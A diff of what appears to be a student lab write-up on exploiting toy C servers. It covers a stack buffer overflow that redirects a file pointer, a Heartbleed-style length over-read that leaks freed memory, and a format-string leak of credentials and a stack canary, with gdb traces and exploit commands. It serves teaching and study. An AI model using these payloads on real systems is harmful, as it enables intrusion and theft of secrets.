@@ -337,6 +337,7 @@ Your task is to carry out a buffer overflow attack against the server to access 
 ### Vulnerability Analysis
 
 After analyzing the `server.c` source code, the vulnerability exists in the `handleClientRequest()` function. The function declares two local variables on the stack:
+
 - `char *file = fpub;` - a pointer initially pointing to `/tmp/public.txt`
 - `char message[MSG_SIZE];` - a buffer of 32 bytes for storing the client message
 
@@ -356,11 +357,13 @@ $ gdb server
 ```
 
 In another terminal, I sent a test message:
+
 ```bash
 $ ./client localhost "AAAAAAAAAAAAAAAA"
 ```
 
 Back in gdb, I examined the stack at the breakpoint:
+
 ```
 (gdb) x/12x message
 0x7fffffffdd50: 0x41414141 0x41414141 0x41414141 0x41414141
@@ -373,12 +376,14 @@ The last two double words (`0x555580a0 0x00005555`) represent the `file` pointer
 **Step 2: Finding Target Addresses**
 
 I added debug output to server.c to print the file pointer addresses:
+
 ```c
 printf("Address of fpub: (%p)\n", fpub);
 printf("Address of fsec: (%p)\n", fsec);
 ```
 
 Running the server showed:
+
 ```
 Address of fpub: (0x00005555555580a0)
 Address of fsec: (0x00005555555580b0)
@@ -387,6 +392,7 @@ Address of fsec: (0x00005555555580b0)
 **Step 3: Crafting the Exploit**
 
 To access secret.txt, I need to:
+
 1. Fill the 32-byte message buffer completely
 2. Fill the 8 bytes of padding
 3. Overwrite the `file` pointer with the address of `fsec` in little-endian format
@@ -398,6 +404,7 @@ To access secret.txt, I need to:
 ```
 
 This sends:
+
 - 40 'A' characters (32 for buffer + 8 for padding)
 - The address `0x00005555555580b0` in little-endian byte order
 
@@ -445,11 +452,13 @@ $ ./server
 ```
 
 In another terminal:
+
 ```bash
 $ ./client localhost AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$'\xb0\x80\x55\x55\x55\x55\x00\x00'
 ```
 
 **Result:** The attack fails. Instead of secret.txt, the server returns public.txt, and eventually the server terminates with:
+
 ```
 *** stack smashing detected ***: terminated
 ```
@@ -465,6 +474,7 @@ $ gdb server
 ```
 
 After sending the test message, I examined memory:
+
 ```
 (gdb) x/20x message
 0x7fffffffdd40: 0x41414141 0x41414141 0x41414141 0x41414141
@@ -474,6 +484,7 @@ After sending the test message, I examined memory:
 ```
 
 Searching further down the stack for the `file` pointer:
+
 ```
 (gdb) x/32x 0x7fffffffdd30
 0x7fffffffdd30: 0x555580a0 0x00005555 0x01800000 0x00000000
@@ -628,6 +639,7 @@ $ gdb server
 ```
 
 In another terminal, I sent a test request:
+
 ```bash
 $ ./client localhost 8 testdata
 ```
@@ -643,6 +655,7 @@ $2 = 0x5555555592a0
 ```
 
 **Critical Discovery:** The `request` buffer is allocated at the **exact same address** where `simData` was previously allocated! This happens because:
+
 - `simulateSensitiveData()` allocates memory, stores sensitive data, then calls `free()`
 - `free()` marks the memory as available but doesn't clear it
 - `readRequest()` allocates memory for the request, and malloc reuses the freed location
@@ -653,6 +666,7 @@ $2 = 0x5555555592a0
 The vulnerability exists in how the server processes the heartbeat request:
 
 **In readRequest():**
+
 ```c
 unsigned int requestLength = readPacketHeader(cfd);
 unsigned char *request = malloc(requestLength);
@@ -660,6 +674,7 @@ unsigned char *request = malloc(requestLength);
 ```
 
 **In sendResponse():**
+
 ```c
 unsigned short payloadLength = readPayloadLength(request);
 // Sends payloadLength bytes back to client
@@ -670,12 +685,14 @@ The problem: The server **trusts the client-provided payloadLength** without ver
 ### Exploitation Process
 
 When a legitimate request is sent with an 8-byte payload:
+
 - Packet header: 10 (2 bytes payload length + 8 bytes payload)
 - Payload length field: 8
 - Payload: "testdata"
 - Server allocates 10 bytes, reads 10 bytes, sends back 8 bytes ✓
 
 When a malicious request is crafted:
+
 - Packet header: 3 (2 bytes payload length + 1 byte payload)
 - Payload length field: **65535** (maximum)
 - Payload: "A" (just 1 byte!)
@@ -688,11 +705,13 @@ $ ./client localhost 65535 A
 ```
 
 This command creates a heartbeat request where:
+
 1. The packet header correctly indicates 3 bytes of data (2 + 1)
 2. The payload length field **lies** and claims 65535 bytes
 3. Only 1 byte of actual payload is sent
 
 **What happens on the server:**
+
 1. `readRequest()` reads the packet header (3 bytes total)
 2. Allocates only 3 bytes of memory at the freed simData location
 3. Reads 3 bytes into this allocation (payload length + 1 byte 'A')
@@ -961,6 +980,7 @@ With the hints above, it should be possible for you to find and understand the v
 The vulnerability is in the `doLogin()` function at line `printf(username)`. This should be `printf("%s", username)` - by passing user input directly as the format string, an attacker can use format specifiers like `%p` or `%x` to read arbitrary stack memory.
 
 The goal is to extract:
+
 1. All usernames and passwords from the `main` function's stack
 2. The saved base pointer (rbp) of main's stack frame
 3. The stack canary value
@@ -1099,6 +1119,7 @@ Sorry Username: 0x7fffffffe080, Password: 0x7fffffffe060, RBP: 0x7fffffffe0a0, t
 ```
 
 **Results:**
+
 - **Credentials:** root/master, john/doe, tom/qwertz (found by examining leaked array addresses in gdb)
 - **Saved RBP:** `0x7fffffffe0a0` (parameter %12)
 - **Stack Canary:** `0x1e0f956441f91c00` (found between passwords array and saved rbp in memory dump)
